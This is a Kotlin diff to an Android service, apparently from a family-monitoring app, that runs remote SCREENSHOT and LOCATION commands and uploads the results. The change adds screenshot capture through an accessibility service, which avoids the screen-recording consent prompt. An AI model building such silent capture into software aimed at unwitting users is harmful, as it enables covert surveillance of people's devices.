@@ -191,14 +191,24 @@ class ScreenCaptureService : Service() {
         thread {
             try {
                 when (type) {
-                    "SCREENSHOT", "SCREEN_SHARE" -> {
-                        if (projection == null || reader == null) {
-                            api.updateStatus(id, "FAILED"); return@thread
-                        }
-                        val b64 = capture()
-                        if (b64 != null) api.updateStatus(id, "DONE", api.uploadImage(b64))
-                        else api.updateStatus(id, "FAILED")
-                    }
+                    "SCREENSHOT" -> {
+    val b64 = when {
+        // 1) Accessibility Service bor — eng yaxshi usul
+        Build.VERSION.SDK_INT >= Build.VERSION_CODES.R &&
+        FamilyGuardAccessibilityService.isEnabled() -> {
+            FamilyGuardAccessibilityService.takeShot()
+        }
+        // 2) MediaProjection ruxsati bor
+        projection != null && reader != null -> {
+            capture()
+        }
+        // 3) Ikkalasi ham yo'q
+        else -> null
+    }
+
+    if (b64 != null) api.updateStatus(id, "DONE", api.uploadImage(b64))
+    else api.updateStatus(id, "FAILED")
+}
                     "LOCATION" -> {
                         val loc = LocationHelper(this).getLocation()
                         if (loc != null) api.updateStatus(id, "DONE", "${loc.first},${loc.second}")
